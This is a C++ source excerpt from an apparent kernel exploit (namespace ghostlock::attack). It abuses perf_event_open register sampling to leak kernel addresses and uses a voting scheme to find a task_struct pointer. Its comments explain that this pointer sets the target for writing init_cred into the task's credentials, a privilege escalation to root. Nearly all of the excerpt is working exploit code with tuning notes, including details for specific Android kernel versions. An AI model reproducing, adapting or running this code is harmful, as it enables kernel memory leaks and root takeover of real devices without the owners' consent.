        struct Cand { uintptr_t v; int32_t votes; uint64_t sites; };
        Cand top[6]{};
        int64_t in_range = 0;
        int64_t total = 0;
        while (scan < head) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(base + (scan % kSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *q = reinterpret_cast<char *>(ev) + sizeof(*ev);
                const uint64_t ip = *reinterpret_cast<uint64_t *>(q);
                q += 8;
                const uint64_t abi = *reinterpret_cast<uint64_t *>(q);
                q += 8;
                total++;
                if (ip >= pid_ns && ip < pid_ns + kPidNsLen && (abi == 1 || abi == 2)) {
                    in_range++;
                    const uint64_t raw = *reinterpret_cast<uint64_t *>(q);
                    const uintptr_t cand = static_cast<uintptr_t>(
                        (raw & 0x0000ffffffffffffULL) | 0xffff000000000000ULL);
                    if ((cand & 0xffffffffULL) >= 0xffff0000ULL) continue;
                    if ((cand & 7) != 0) continue;
                    const auto site = static_cast<uint64_t>(((ip - pid_ns) >> 3) & 63);
                    for (int32_t k = 0; k < 6; k++) {
                        if (top[k].votes && top[k].v == cand) {
                            top[k].votes++;
                            top[k].sites |= 1ULL << site;
                            break;
                        }
                        if (!top[k].votes) {
                            top[k].v = cand;
                            top[k].votes = 1;
                            top[k].sites = 1ULL << site;
                            break;
                        }
                    }
                }
            }
            scan += ev->size;
        }
        pr_info("[dbg] arg samples=%ld in_pid_ns=%ld\n", (long) total, (long) in_range);
        uintptr_t best = 0;
        int32_t best_sites = 0;
        for (int32_t k = 0; k < 6; k++) {
            if (!top[k].votes) continue;
            const int32_t sites = __builtin_popcountll(top[k].sites);
            pr_info("[dbg]   arg cand %016zx x%d sites=%d\n",
                    (size_t) top[k].v, top[k].votes, sites);
            if (sites > best_sites) { best_sites = sites; best = top[k].v; }
        }
        return best_sites >= 2 ? best : 0;
    }

    uintptr_t perf_find_task(void) {
        {
            const uintptr_t via_arg = perf_task_from_current_arg();
            if (via_arg) {
                pr_info("perf task (arg): 0x%016zx\n", (size_t) via_arg);
                return via_arg;
            }
        }
        if (getenv("GHOSTLOCK_PERF_BP")) {
            const uintptr_t via_bp = perf_task_breakpoint_probe();
            if (via_bp) {
                pr_info("perf task (bp): 0x%016zx\n", (size_t) via_bp);
                return via_bp;
            }
        }
        if (getenv("GHOSTLOCK_PERF_SWITCH")) {
            const uintptr_t via_switch = perf_task_switch_probe();
            if (via_switch) {
                pr_info("perf task (switch): 0x%016zx\n", (size_t) via_switch);
                return via_switch;
            }
        }
        {
            const uintptr_t sleeping = perf_find_task_sleeping();
            if (sleeping) {
                pr_info("perf task (sleeping): 0x%016zx\n", (size_t) sleeping);
                return sleeping;
            }
            const uintptr_t via_pid = perf_task_from_pid_ns();
            if (via_pid) {
                pr_info("perf task (pid_ns): 0x%016zx\n", (size_t) via_pid);
                return via_pid;
            }
        }
        struct perf_event_attr pe{};
        pe.type = PERF_TYPE_SOFTWARE;
        pe.size = sizeof(pe);
        pe.config = PERF_COUNT_SW_CPU_CLOCK;
        pe.sample_period = 5000;
        pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
        pe.sample_regs_intr = (1ULL << 32) - 1;
        pe.disabled = 1;
        pe.exclude_user = 1;
        pe.exclude_hv = 1;
        pe.exclude_idle = 1;

        errno = 0;
        support::UniqueFd fd(static_cast<int32_t>(syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0)));
        if (!fd.valid()) {
            pr_warning("perf_event_open failed errno=%d\n", errno);
            return 0;
        }
        constexpr size_t kPerfPageSize = 4096;
        /* Ring sizing matters far more than it looks. Each sample carries 32
         * registers (~272 bytes with headers), so a 32-page ring retains only
         * ~481 of the 500000 getpid calls requested below. ~99.9% of the
         * samples are dropped and the vote is then taken over a candidate pool
         * that never fills, which is why votes used to come out at 48-51/256
         * with no separation between the real task pointer and noise. W2's
         * write target is derived from this leak (child_task +
         * TASK_CRED_OFF), so a wrong pick writes init_cred into unrelated
         * kernel memory. 256 pages retain ~3800 samples. */
        constexpr size_t kPerfDataPages = 256;
        constexpr size_t kPerfDataSize = kPerfPageSize * kPerfDataPages;
        const size_t msz = kPerfPageSize + kPerfDataSize;
        void *mapped = mmap(nullptr, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd.get(), 0);
        if (mapped == MAP_FAILED) {
            pr_warning("perf mmap failed errno=%d\n", errno);
            return 0;
        }
        /* Declaration order keeps the original release order: munmap (buf) runs
         * before close (fd) when this scope exits. */
        support::MappedRegion buf(mapped, msz);
        ioctl(fd.get(), PERF_EVENT_IOC_ENABLE, 0);
        for (int32_t i = 0; i < 500000; i++) syscall(__NR_getpid);
        ioctl(fd.get(), PERF_EVENT_IOC_DISABLE, 0);
        auto *hdr = static_cast<struct perf_event_mmap_page *>(buf.data());
        const uint64_t head = hdr->data_head;
        std::atomic_thread_fence(std::memory_order_acquire);
        char *base = reinterpret_cast<char *>(buf.data()) + kPerfPageSize;
        uint64_t pos = hdr->data_tail;
        std::array<uintptr_t, 8192> cands{};
        int32_t nc = 0;
        while (pos < head && nc < static_cast<int32_t>(cands.size())) {
            auto *ev = reinterpret_cast<struct perf_event_header *>(
                base + (pos % kPerfDataSize));
            if (ev->size == 0) break;
            if (ev->type == PERF_RECORD_SAMPLE) {
                char *p = reinterpret_cast<char *>(ev) + sizeof(*ev);
                p += 8; /* skip IP */
                uint64_t abi = *reinterpret_cast<uint64_t *>(p);
                p += 8;
                if (abi == 1 || abi == 2) {
                    uint64_t *regs = reinterpret_cast<uint64_t *>(p);
                    for (int32_t i = 0; i < 32 && nc < static_cast<int32_t>(cands.size()); i++) {
                        uint64_t v = regs[i];
                        /* Rebuild the canonical kernel VA instead of OR-ing in a
                         * tag nibble. Android 5.x/6.x kernels tag kernel
                         * pointers by randomising bits 56-59, so OR-ing 0xf<<56
                         * was enough there; this 4.14 kernel has no tag, and the
                         * old form turned every small negative register value
                         * into a plausible direct-map address (0xffffffd0 ->
                         * 0xffffff0fffffffd0), which is why the vote pool
                         * saturated at 8192 and the winner was noise. Keeping
                         * the low 48 bits and forcing the top 16 to 0xffff is
                         * the identity for a real kernel pointer and rejects
                         * anything that is not 0xffffff80..0xffffffbf. */
                        v = (v & 0x0000ffffffffffffULL) | 0xffff000000000000ULL;
                        /* Small negative values (error codes such as -EAGAIN)
                         * canonicalise to 0xffffff80ffffffd0 and used to win the
                         * vote.  A real kernel pointer keeps a wide low half;
                         * reject the sign-extended-short form outright. */
                        if ((v & 0xffffffffULL) >= 0xffff0000ULL) continue;
                        if ((v & 7ULL) == 0 && in_direct_map(v))
                            cands[static_cast<size_t>(nc++)] = v;
                    }
                }
            }
            pos += ev->size;
        }
        hdr->data_tail = head;
        if (!nc) return 0;
        uintptr_t best = 0;
        int32_t best_cnt = 0;
        for (int32_t i = 0; i < nc; i++) {
            const auto at = cands[static_cast<size_t>(i)];
            const int32_t cnt = static_cast<int32_t>(
                std::count(cands.begin(), cands.begin() + nc, at));
            if (cnt > best_cnt) {
                best_cnt = cnt;
                best = at;
            }
        }
        pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
        {
            /* dbg: distinct top candidates */
            struct Entry { uintptr_t v; int32_t c; };
            Entry top[6]{};
            int32_t ntop = 0;
            for (int32_t i = 0; i < nc; i++) {
                const auto at = cands[static_cast<size_t>(i)];
                const int32_t cnt = static_cast<int32_t>(
                    std::count(cands.begin(), cands.begin() + nc, at));
                bool known = false;
                for (int32_t k = 0; k < ntop; k++) if (top[k].v == at) known = true;
                if (known) continue;
                if (ntop < 6) {
                    top[ntop].v = at; top[ntop].c = cnt; ntop++;
                } else {
                    int32_t worst = 0;
                    for (int32_t k = 1; k < 6; k++) if (top[k].c < top[worst].c) worst = k;
                    if (cnt > top[worst].c) { top[worst].v = at; top[worst].c = cnt; }
                }
            }
            for (int32_t k = 0; k < ntop; k++)
                pr_info("[dbg] cand %016zx  x%d\n", (size_t)top[k].v, top[k].c);
        }
        return best;
    }
} // namespace ghostlock::attack
